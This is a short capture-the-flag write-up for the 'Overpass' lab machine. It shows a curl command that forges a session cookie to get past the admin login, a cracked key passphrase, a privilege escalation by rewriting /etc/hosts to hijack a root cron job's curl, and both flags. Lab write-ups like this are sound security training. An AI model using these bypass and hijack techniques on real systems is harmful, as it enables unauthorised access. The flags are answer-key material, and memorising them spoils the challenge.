# Overpass

> John Hammond | August 17th, 2020

----------------------------------

# 1. Hack the machine and get the flag in user.txt

```
curl http://10.10.252.240/admin/ --cookie SessionToken=anything
```

Password for the private key cracked to be `james13`

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

# 2. Escalate your privileges and get the flag in root.txt

Crontab curling webpage ---
we can modify /etc/hosts

```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```